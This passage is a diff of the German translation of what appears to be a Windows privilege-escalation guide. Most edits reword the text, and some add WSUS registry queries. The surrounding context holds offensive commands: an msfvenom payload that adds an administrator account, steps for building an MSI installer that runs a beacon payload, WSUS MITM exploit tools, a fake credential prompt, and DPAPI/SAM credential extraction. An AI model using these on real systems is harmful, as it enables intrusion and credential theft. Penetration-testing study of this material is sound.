@@ -85,7 +85,7 @@ set
 dir env:
 Get-ChildItem Env: | ft Key,Value -AutoSize
 ```
-### PowerShell Verlauf
+### PowerShell-Historie
 ```bash
 ConsoleHost_history #Find the PATH where is saved
 
@@ -110,9 +110,9 @@ dir C:\Transcripts
 Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
 Stop-Transcript
 ```
-### PowerShell-Modulprotokollierung
+### PowerShell Modulprotokollierung
 
-Details zu PowerShell-Pipeline-Ausführungen werden aufgezeichnet, einschließlich ausgeführter Befehle, Befehlsaufrufe und Teile von Skripten. Es könnten jedoch nicht alle Ausführungsdetails und Ausgabeergebnisse erfasst werden.
+Details zu PowerShell-Pipeline-Ausführungen werden aufgezeichnet, einschließlich ausgeführter Befehle, Befehlsaufrufe und Teile von Skripten. Allerdings könnten vollständige Ausführungsdetails und Ausgabeergebnisse nicht erfasst werden.
 
 Um dies zu aktivieren, folgen Sie den Anweisungen im Abschnitt "Transkriptdateien" der Dokumentation und wählen Sie **"Modulprotokollierung"** anstelle von **"Powershell-Transkription"**.
 ```bash
@@ -134,7 +134,7 @@ reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 ```
-Die Protokollereignisse für den Script Block können im Windows-Ereignisanzeiger unter dem Pfad: **Anwendungs- und Dienstprotokolle > Microsoft > Windows > PowerShell > Betrieb** gefunden werden.\
+Die Protokollereignisse für das Script Block können im Windows-Ereignisanzeiger unter dem Pfad: **Anwendungs- und Dienstprotokolle > Microsoft > Windows > PowerShell > Betrieb** gefunden werden.\
 Um die letzten 20 Ereignisse anzuzeigen, können Sie Folgendes verwenden:
 ```bash
 Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
@@ -154,20 +154,33 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
 
 Sie können das System kompromittieren, wenn die Updates nicht über http**S**, sondern über http angefordert werden.
 
-Sie beginnen damit, zu überprüfen, ob das Netzwerk ein nicht-SSL WSUS-Update verwendet, indem Sie Folgendes ausführen:
+Sie beginnen damit, zu überprüfen, ob das Netzwerk ein nicht-SSL WSUS-Update verwendet, indem Sie Folgendes in cmd ausführen:
 ```
 reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
 ```
-Wenn Sie eine Antwort wie folgt erhalten:
+Oder das Folgende in PowerShell:
+```
+Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
+```
+Wenn Sie eine Antwort wie eine der folgenden erhalten:
 ```bash
 HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
 WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
 ```
-Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` gleich `1` ist.
+
+```bash
+WUServer     : http://xxxx-updxx.corp.internal.com:8530
+PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
+PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
+PSChildName  : windowsupdate
+PSDrive      : HKLM
+PSProvider   : Microsoft.PowerShell.Core\Registry
+```
+Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.
 
 Dann ist **es ausnutzbar.** Wenn der letzte Registrierungseintrag gleich 0 ist, wird der WSUS-Eintrag ignoriert.
 
-Um diese Schwachstellen auszunutzen, können Sie Tools wie: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) verwenden - Dies sind MiTM-waffenfähige Exploit-Skripte, um 'falsche' Updates in nicht-SSL WSUS-Verkehr einzuschleusen.
+Um diese Schwachstellen auszunutzen, können Sie Tools wie: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) verwenden - Dies sind MiTM-waffenfähige Exploit-Skripte, um 'falsche' Updates in nicht-SSL WSUS-Verkehr einzuspeisen.
 
 Lesen Sie die Forschung hier:
 
@@ -182,7 +195,7 @@ Im Grunde ist dies der Fehler, den dieser Bug ausnutzt:
 
 > Wenn wir die Möglichkeit haben, unseren lokalen Benutzerproxy zu ändern, und Windows Updates den im Internet Explorer konfigurierten Proxy verwendet, haben wir daher die Möglichkeit, [PyWSUS](https://github.com/GoSecure/pywsus) lokal auszuführen, um unseren eigenen Verkehr abzufangen und Code als erhöhter Benutzer auf unserem Asset auszuführen.
 >
-> Darüber hinaus verwendet der WSUS-Dienst die Einstellungen des aktuellen Benutzers, daher wird auch dessen Zertifikatspeicher verwendet. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostnamen generieren und dieses Zertifikat in den Zertifikatspeicher des aktuellen Benutzers einfügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Verkehr abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine Vertrauensprüfung bei der ersten Verwendung auf dem Zertifikat zu implementieren. Wenn das präsentierte Zertifikat vom Benutzer vertraut wird und den richtigen Hostnamen hat, wird es vom Dienst akzeptiert.
+> Darüber hinaus verwendet der WSUS-Dienst die Einstellungen des aktuellen Benutzers, daher wird auch dessen Zertifikatspeicher verwendet. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostnamen generieren und dieses Zertifikat in den Zertifikatspeicher des aktuellen Benutzers einfügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Verkehr abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine Validierung des Zertifikats nach dem Prinzip "Vertrauen beim ersten Gebrauch" zu implementieren. Wenn das präsentierte Zertifikat vom Benutzer vertraut wird und den richtigen Hostnamen hat, wird es vom Dienst akzeptiert.
 
 Sie können diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es freigegeben ist).
 
@@ -210,11 +223,11 @@ Wenn Sie eine Meterpreter-Sitzung haben, können Sie diese Technik mit dem Modul
 
 ### PowerUP
 
-Verwenden Sie den Befehl `Write-UserAddMSI` von PowerUP, um im aktuellen Verzeichnis eine Windows MSI-Binärdatei zu erstellen, um Privilegien zu eskalieren. Dieses Skript erstellt einen vorkompilierten MSI-Installer, der nach einer Benutzer-/Gruppenzuordnung fragt (Sie benötigen also GUI-Zugriff):
+Verwenden Sie den Befehl `Write-UserAddMSI` von PowerUP, um im aktuellen Verzeichnis eine Windows MSI-Binärdatei zu erstellen, um Privilegien zu eskalieren. Dieses Skript erstellt einen vorkompilierten MSI-Installer, der nach einer Benutzer-/Gruppenzusammenführung fragt (Sie benötigen also GIU-Zugriff):
 ```
 Write-UserAddMSI
 ```
-Führen Sie einfach die erstellte Binärdatei aus, um die Berechtigungen zu eskalieren.
+Führen Sie einfach die erstellte Binärdatei aus, um die Berechtigungen zu erhöhen.
 
 ### MSI Wrapper
 
@@ -233,7 +246,7 @@ create-msi-with-wix.md
 ### Erstellen Sie MSI mit Visual Studio
 
 - **Generieren** Sie mit Cobalt Strike oder Metasploit eine **neue Windows EXE TCP Payload** in `C:\privesc\beacon.exe`
-- Öffnen Sie **Visual Studio**, wählen Sie **Ein neues Projekt erstellen** und geben Sie "installer" in das Suchfeld ein. Wählen Sie das **Setup Wizard**-Projekt und klicken Sie auf **Weiter**.
+- Öffnen Sie **Visual Studio**, wählen Sie **Neues Projekt erstellen** und geben Sie "installer" in das Suchfeld ein. Wählen Sie das **Setup Wizard**-Projekt und klicken Sie auf **Weiter**.
 - Geben Sie dem Projekt einen Namen, wie **AlwaysPrivesc**, verwenden Sie **`C:\privesc`** für den Speicherort, wählen Sie **Lösung und Projekt im selben Verzeichnis platzieren** und klicken Sie auf **Erstellen**.
 - Klicken Sie weiter auf **Weiter**, bis Sie zu Schritt 3 von 4 (Dateien auswählen) gelangen. Klicken Sie auf **Hinzufügen** und wählen Sie die gerade generierte Beacon-Payload aus. Klicken Sie dann auf **Fertigstellen**.
 - Markieren Sie das **AlwaysPrivesc**-Projekt im **Solution Explorer** und ändern Sie in den **Eigenschaften** **TargetPlatform** von **x86** auf **x64**.
@@ -241,7 +254,7 @@ create-msi-with-wix.md
 - Klicken Sie mit der rechten Maustaste auf das Projekt und wählen Sie **Ansicht > Benutzerdefinierte Aktionen**.
 - Klicken Sie mit der rechten Maustaste auf **Installieren** und wählen Sie **Benutzerdefinierte Aktion hinzufügen**.
 - Doppelklicken Sie auf **Anwendungsordner**, wählen Sie Ihre **beacon.exe**-Datei aus und klicken Sie auf **OK**. Dies stellt sicher, dass die Beacon-Payload ausgeführt wird, sobald der Installer gestartet wird.
-- Ändern Sie unter den **Eigenschaften der benutzerdefinierten Aktion** **Run64Bit** auf **True**.
+- Ändern Sie unter den **Eigenschaften der benutzerdefinierten Aktion** **Run64Bit** in **True**.
 - Schließlich **bauen** Sie es.
 - Wenn die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stellen Sie sicher, dass Sie die Plattform auf x64 eingestellt haben.
 
@@ -269,7 +282,7 @@ reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\Subs
 ```
 ### LAPS
 
-**LAPS** ist für die **Verwaltung von lokalen Administratorpasswörtern** konzipiert, wobei sichergestellt wird, dass jedes Passwort **einzigartig, randomisiert und regelmäßig aktualisiert** wird auf Computern, die einer Domäne beigetreten sind. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern abgerufen werden, die über ausreichende Berechtigungen durch ACLs verfügen, die es ihnen ermöglichen, lokale Admin-Passwörter einzusehen, wenn sie autorisiert sind.
+**LAPS** ist für die **Verwaltung von lokalen Administratorpasswörtern** konzipiert, wobei sichergestellt wird, dass jedes Passwort **einzigartig, zufällig und regelmäßig aktualisiert** wird auf Computern, die einer Domäne beigetreten sind. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern abgerufen werden, die über ausreichende Berechtigungen durch ACLs verfügen, die es ihnen ermöglichen, lokale Admin-Passwörter einzusehen, wenn sie autorisiert sind.
 
 {{#ref}}
 ../active-directory-methodology/laps.md
@@ -284,7 +297,7 @@ reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v U
 ```
 ### LSA-Schutz
 
-Beginnend mit **Windows 8.1** führte Microsoft einen verbesserten Schutz für die Local Security Authority (LSA) ein, um **Versuche** untrusted Prozesse zu **blockieren**, ihren Speicher **zu lesen** oder Code einzuschleusen, was das System weiter absichert.\
+Beginnend mit **Windows 8.1** führte Microsoft einen verbesserten Schutz für die Local Security Authority (LSA) ein, um **Versuche** untrusted Prozesse zu **blockieren**, ihren Speicher **zu lesen** oder Code zu injizieren, was das System weiter absichert.\
 [**Weitere Informationen zum LSA-Schutz hier**](../stealing-credentials/credentials-protections.md#lsa-protection).
 ```bash
 reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
@@ -352,15 +365,15 @@ Get-ChildItem C:\Users
 ```bash
 net accounts
 ```
-### Den Inhalt der Zwischenablage abrufen
+### Holen Sie sich den Inhalt der Zwischenablage
 ```bash
 powershell -command "Get-Clipboard"
 ```
 ## Ausgeführte Prozesse
 
-### Datei- und Ordners Berechtigungen
+### Datei- und Ordnerberechtigungen
 
-Zuerst sollten Sie die Prozesse **auf Passwörter in der Befehlszeile des Prozesses überprüfen**.\
+Zuerst sollten die Prozesse **auf Passwörter in der Befehlszeile des Prozesses überprüfen**.\
 Überprüfen Sie, ob Sie **eine laufende Binärdatei überschreiben** können oder ob Sie Schreibberechtigungen für den Binärordner haben, um mögliche [**DLL Hijacking-Angriffe**](dll-hijacking/index.html) auszunutzen:
 ```bash
 Tasklist /SVC #List processes running and services
@@ -443,7 +456,7 @@ Sie können ihn aktivieren, indem Sie
 sc config SSDPSRV start= demand
 sc config SSDPSRV obj= ".\LocalSystem" password= ""
 ```
-**Berücksichtigen Sie, dass der Dienst upnphost von SSDPSRV abhängt, um zu funktionieren (für XP SP1)**
+**Beachten Sie, dass der Dienst upnphost von SSDPSRV abhängt, um zu funktionieren (für XP SP1)**
 
 **Eine weitere Lösung** dieses Problems besteht darin, Folgendes auszuführen:
 ```
@@ -501,7 +514,7 @@ for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\
 
 get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
 ```
-Es sollte überprüft werden, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** `FullControl`-Berechtigungen besitzen. Falls ja, kann die von dem Dienst ausgeführte Binärdatei geändert werden.
+Es sollte überprüft werden, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** `FullControl`-Berechtigungen besitzen. Wenn ja, kann die von dem Dienst ausgeführte Binärdatei geändert werden.
 
 Um den Pfad der ausgeführten Binärdatei zu ändern:
 ```bash
@@ -549,15 +562,15 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 ```bash
 msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
 ```
-### Recovery Actions
+### Wiederherstellungsaktionen
 
 Windows ermöglicht es Benutzern, Aktionen festzulegen, die ergriffen werden sollen, wenn ein Dienst fehlschlägt. Diese Funktion kann so konfiguriert werden, dass sie auf eine Binärdatei verweist. Wenn diese Binärdatei ersetzbar ist, könnte eine Privilegieneskalation möglich sein. Weitere Details finden Sie in der [offiziellen Dokumentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).
 
-## Applications
+## Anwendungen
 
-### Installed Applications
+### Installierte Anwendungen
 
-Überprüfen Sie **die Berechtigungen der Binärdateien** (vielleicht können Sie eine überschreiben und Privilegien eskalieren) und der **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).
+Überprüfen Sie die **Berechtigungen der Binärdateien** (vielleicht können Sie eine überschreiben und Privilegien eskalieren) und der **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).
 ```bash
 dir /a "C:\Program Files"
 dir /a "C:\Program Files (x86)"
@@ -604,7 +617,7 @@ privilege-escalation-with-autorun-binaries.md
 
 ### Treiber
 
-Suchen Sie nach möglichen **drittanbieter-ungewöhnlichen/anfälligen** Treibern.
+Suchen Sie nach möglichen **drittanbieter-seltsamen/anfälligen** Treibern.
 ```bash
 driverquery
 driverquery.exe /fo table
@@ -634,9 +647,9 @@ net view \\computer /ALL #List shares of a computer
 net use x: \\computer\share #Mount the share locally
 net share #Check current shares
 ```
-### hosts-Datei
+### hosts file
 
-Überprüfen Sie die anderen bekannten Computer, die in der hosts-Datei fest codiert sind.
+Überprüfen Sie die im Hosts-Datei fest codierten anderen bekannten Computer.
 ```
 type C:\Windows\System32\drivers\etc\hosts
 ```
@@ -702,12 +715,12 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDef
 ```
 ### Anmeldeinformationsmanager / Windows-Tresor
 
-Von [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
-Der Windows-Tresor speichert Benutzeranmeldeinformationen für Server, Websites und andere Programme, bei denen **Windows** die Benutzer **automatisch anmelden kann**. Auf den ersten Blick mag es so aussehen, als könnten Benutzer jetzt ihre Facebook-Anmeldeinformationen, Twitter-Anmeldeinformationen, Gmail-Anmeldeinformationen usw. speichern, damit sie sich automatisch über Browser anmelden. Aber das ist nicht der Fall.
+From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
+Der Windows-Tresor speichert Benutzeranmeldeinformationen für Server, Websites und andere Programme, die **Windows** die **automatische Anmeldung der Benutzer ermöglichen**. Auf den ersten Blick mag es so aussehen, als könnten Benutzer ihre Facebook-Anmeldeinformationen, Twitter-Anmeldeinformationen, Gmail-Anmeldeinformationen usw. speichern, damit sie sich automatisch über Browser anmelden. Aber das ist nicht der Fall.
 
 Der Windows-Tresor speichert Anmeldeinformationen, mit denen Windows die Benutzer automatisch anmelden kann, was bedeutet, dass jede **Windows-Anwendung, die Anmeldeinformationen benötigt, um auf eine Ressource** (Server oder Website) **zuzugreifen, diesen Anmeldeinformationsmanager** & Windows-Tresor nutzen und die bereitgestellten Anmeldeinformationen verwenden kann, anstatt dass die Benutzer ständig ihren Benutzernamen und ihr Passwort eingeben.
 
-Es sei denn, die Anwendungen interagieren mit dem Anmeldeinformationsmanager, denke ich nicht, dass es möglich ist, dass sie die Anmeldeinformationen für eine bestimmte Ressource verwenden. Wenn Ihre Anwendung also den Tresor nutzen möchte, sollte sie irgendwie **mit dem Anmeldeinformationsmanager kommunizieren und die Anmeldeinformationen für diese Ressource** aus dem Standardspeichertresor anfordern.
+Es sei denn, die Anwendungen interagieren mit dem Anmeldeinformationsmanager, denke ich nicht, dass es ihnen möglich ist, die Anmeldeinformationen für eine bestimmte Ressource zu verwenden. Wenn Ihre Anwendung also den Tresor nutzen möchte, sollte sie irgendwie **mit dem Anmeldeinformationsmanager kommunizieren und die Anmeldeinformationen für diese Ressource** aus dem Standardspeichertresor anfordern.
 
 Verwenden Sie `cmdkey`, um die gespeicherten Anmeldeinformationen auf dem Computer aufzulisten.
 ```bash
@@ -729,18 +742,18 @@ Beachten Sie, dass mimikatz, lazagne, [credentialfileview](https://www.nirsoft.n
 
 ### DPAPI
 
-Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten, die hauptsächlich im Windows-Betriebssystem zur symmetrischen Verschlüsselung asymmetrischer privater Schlüssel verwendet wird. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, um erheblich zur Entropie beizutragen.
+Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten, die hauptsächlich im Windows-Betriebssystem zur symmetrischen Verschlüsselung von asymmetrischen privaten Schlüsseln verwendet wird. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, um erheblich zur Entropie beizutragen.
 
 **DPAPI ermöglicht die Verschlüsselung von Schlüsseln durch einen symmetrischen Schlüssel, der aus den Anmeldegeheimnissen des Benutzers abgeleitet wird**. In Szenarien mit Systemverschlüsselung verwendet es die Authentifizierungsgeheimnisse der Domäne des Systems.
 
-Verschlüsselte Benutzer-RSA-Schlüssel, die mit DPAPI erstellt wurden, werden im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` den [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers darstellt. **Der DPAPI-Schlüssel, der zusammen mit dem Master-Schlüssel, der die privaten Schlüssel des Benutzers im selben Datei schützt, gespeichert ist**, besteht typischerweise aus 64 Bytes zufälliger Daten. (Es ist wichtig zu beachten, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist, was das Auflisten seines Inhalts über den `dir`-Befehl in CMD verhindert, obwohl es über PowerShell aufgelistet werden kann).
+Verschlüsselte Benutzer-RSA-Schlüssel, die mit DPAPI verwendet werden, werden im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` den [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers darstellt. **Der DPAPI-Schlüssel, der zusammen mit dem Master-Schlüssel, der die privaten Schlüssel des Benutzers im selben Datei schützt, gespeichert ist**, besteht typischerweise aus 64 Bytes zufälliger Daten. (Es ist wichtig zu beachten, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist, was das Auflisten seines Inhalts über den `dir`-Befehl in CMD verhindert, obwohl es über PowerShell aufgelistet werden kann).
 ```powershell
 Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
 ```
 Sie können das **mimikatz-Modul** `dpapi::masterkey` mit den entsprechenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.
 
-Die **von dem Master-Passwort geschützten Anmeldeinformationsdateien** befinden sich normalerweise in:
+Die **von dem Master-Passwort geschützten Anmeldeinformationen-Dateien** befinden sich normalerweise in:
 ```powershell
 dir C:\Users\username\AppData\Local\Microsoft\Credentials\
 dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
@@ -758,7 +771,7 @@ dpapi-extracting-passwords.md
 
 **PowerShell-Anmeldeinformationen** werden häufig für **Skripting** und Automatisierungsaufgaben verwendet, um verschlüsselte Anmeldeinformationen bequem zu speichern. Die Anmeldeinformationen sind durch **DPAPI** geschützt, was typischerweise bedeutet, dass sie nur von demselben Benutzer auf demselben Computer entschlüsselt werden können, auf dem sie erstellt wurden.
 
-Um eine PS-Anmeldeinformation aus der Datei, die sie enthält, zu **entschlüsseln**, können Sie Folgendes tun:
+Um **PS-Anmeldeinformationen** aus der Datei, die sie enthält, zu **entschlüsseln**, können Sie Folgendes tun:
 ```powershell
 PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
 PS C:\> $credential.GetNetworkCredential().username
@@ -904,7 +917,7 @@ reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
 ```
 ### SSH-Schlüssel in der Registrierung
 
-SSH-Private Schlüssel können im Registrierungsschlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert werden, daher sollten Sie überprüfen, ob dort etwas Interessantes vorhanden ist:
+SSH-Private Schlüssel können im Registrierungsschlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert werden, daher sollten Sie überprüfen, ob dort etwas Interessantes zu finden ist:
 ```bash
 reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
 ```
@@ -916,7 +929,7 @@ Wenn der `ssh-agent`-Dienst nicht läuft und Sie möchten, dass er beim Booten a
 Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
 ```
 > [!NOTE]
-> Es scheint, dass diese Technik nicht mehr gültig ist. Ich habe versucht, einige SSH-Schlüssel zu erstellen, sie mit `ssh-add` hinzuzufügen und mich über SSH bei einer Maschine anzumelden. Der Registrierungseintrag HKCU\Software\OpenSSH\Agent\Keys existiert nicht und Procmon hat die Verwendung von `dpapi.dll` während der asymmetrischen Schlüsselauthentifizierung nicht identifiziert.
+> Es scheint, dass diese Technik nicht mehr gültig ist. Ich habe versucht, einige SSH-Schlüssel zu erstellen, sie mit `ssh-add` hinzuzufügen und mich über SSH bei einer Maschine anzumelden. Der Registrierungspfad HKCU\Software\OpenSSH\Agent\Keys existiert nicht und Procmon hat die Verwendung von `dpapi.dll` während der asymmetrischen Schlüsselauthentifizierung nicht identifiziert.
 
 ### Unattended files
 ```
@@ -952,7 +965,7 @@ Sie können diese Dateien auch mit **metasploit** suchen: _post/windows/gather/e
 </LocalAccounts>
 </UserAccounts>
 ```
-### SAM & SYSTEM Sicherungen
+### SAM & SYSTEM-Backups
 ```bash
 # Usually %SYSTEMROOT% = C:\Windows
 %SYSTEMROOT%\repair\SAM
@@ -1054,7 +1067,7 @@ Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAct
 ```
 ### Nach Anmeldeinformationen fragen
 
-Sie können immer **den Benutzer bitten, seine Anmeldeinformationen oder sogar die Anmeldeinformationen eines anderen Benutzers einzugeben**, wenn Sie denken, dass er sie wissen könnte (beachten Sie, dass **den** Client direkt nach den **Anmeldeinformationen** zu **fragen** wirklich **riskant** ist):
+Sie können immer **den Benutzer bitten, seine Anmeldeinformationen oder sogar die Anmeldeinformationen eines anderen Benutzers einzugeben**, wenn Sie denken, dass er sie wissen könnte (beachten Sie, dass es wirklich **riskant** ist, den **Kunden** direkt nach den **Anmeldeinformationen** zu fragen):
 ```bash
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password
@@ -1170,9 +1183,9 @@ Tools zum Extrahieren von Passwörtern aus Browsern:
 
 **Component Object Model (COM)** ist eine Technologie, die im Windows-Betriebssystem integriert ist und die **Interkommunikation** zwischen Softwarekomponenten verschiedener Sprachen ermöglicht. Jede COM-Komponente wird **über eine Klassen-ID (CLSID)** identifiziert, und jede Komponente bietet Funktionalität über eine oder mehrere Schnittstellen, die über Schnittstellen-IDs (IIDs) identifiziert werden.
 
-COM-Klassen und -Schnittstellen sind in der Registry unter **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** und **HKEY\_**_**CLASSES\_**_**ROOT\Interface** definiert. Diese Registry wird erstellt, indem **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT** zusammengeführt werden.
+COM-Klassen und -Schnittstellen sind im Registrierungseditor unter **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** und **HKEY\_**_**CLASSES\_**_**ROOT\Interface** definiert. Diese Registrierung wird erstellt, indem **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT** zusammengeführt wird.
 
-Innerhalb der CLSIDs dieser Registry finden Sie die untergeordnete Registry **InProcServer32**, die einen **Standardwert** enthält, der auf eine **DLL** verweist, und einen Wert namens **ThreadingModel**, der **Apartment** (Einzel-Thread), **Free** (Multi-Thread), **Both** (Einzel- oder Multi) oder **Neutral** (Thread-Neutral) sein kann.
+Innerhalb der CLSIDs dieser Registrierung finden Sie den untergeordneten Registrierungseintrag **InProcServer32**, der einen **Standardwert** enthält, der auf eine **DLL** verweist, und einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single oder Multi) oder **Neutral** (Thread Neutral) sein kann.
 
 ![](<../../images/image (729).png>)
 
@@ -1184,7 +1197,7 @@ Um zu erfahren, wie Angreifer COM-Hijacking als Persistenzmechanismus verwenden,
 com-hijacking.md
 {{#endref}}
 
-### **Allgemeine Passwortsuche in Dateien und Registry**
+### **Allgemeine Passwortsuche in Dateien und der Registry**
 
 **Nach Dateiinhalten suchen**
 ```bash
@@ -1223,15 +1236,15 @@ Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 Stellen Sie sich vor, dass **ein Prozess, der als SYSTEM ausgeführt wird, einen neuen Prozess** (`OpenProcess()`) mit **voller Zugriffsberechtigung** öffnet. Der gleiche Prozess **erstellt auch einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Berechtigungen, der jedoch alle offenen Handles des Hauptprozesses erbt**.\
 Wenn Sie dann **vollen Zugriff auf den niedrig privilegierten Prozess** haben, können Sie das **offene Handle zum privilegierten Prozess, das mit `OpenProcess()` erstellt wurde**, ergreifen und **Shellcode injizieren**.\
 [Lesen Sie dieses Beispiel für weitere Informationen darüber, **wie man diese Schwachstelle erkennt und ausnutzt**.](leaked-handle-exploitation.md)\
-[Lesen Sie diesen **anderen Beitrag für eine umfassendere Erklärung, wie man mehr offene Handles von Prozessen und Threads, die mit unterschiedlichen Berechtigungsstufen (nicht nur voller Zugriff) geerbt wurden, testet und missbraucht**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
+[Lesen Sie diesen **anderen Beitrag für eine umfassendere Erklärung, wie man mehr offene Handles von Prozessen und Threads testet und missbraucht, die mit unterschiedlichen Berechtigungsstufen (nicht nur voller Zugriff) geerbt wurden**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
 
 ## Named Pipe Client Impersonation
 
-Gemeinsame Speichersegmente, die als **Pipes** bezeichnet werden, ermöglichen die Kommunikation und den Datenaustausch zwischen Prozessen.
+Geteilte Speichersegmente, die als **Pipes** bezeichnet werden, ermöglichen die Kommunikation und den Datenaustausch zwischen Prozessen.
 
 Windows bietet eine Funktion namens **Named Pipes**, die es nicht verwandten Prozessen ermöglicht, Daten zu teilen, selbst über verschiedene Netzwerke hinweg. Dies ähnelt einer Client/Server-Architektur, bei der die Rollen als **Named Pipe Server** und **Named Pipe Client** definiert sind.
 
-Wenn Daten durch eine Pipe von einem **Client** gesendet werden, hat der **Server**, der die Pipe eingerichtet hat, die Möglichkeit, die **Identität** des **Clients** zu **übernehmen**, vorausgesetzt, er hat die erforderlichen **SeImpersonate**-Rechte. Die Identifizierung eines **privilegierten Prozesses**, der über eine Pipe kommuniziert und den Sie nachahmen können, bietet die Möglichkeit, **höhere Berechtigungen zu erlangen**, indem Sie die Identität dieses Prozesses übernehmen, sobald er mit der von Ihnen eingerichteten Pipe interagiert. Für Anweisungen zur Durchführung eines solchen Angriffs sind hilfreiche Anleitungen [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system) zu finden.
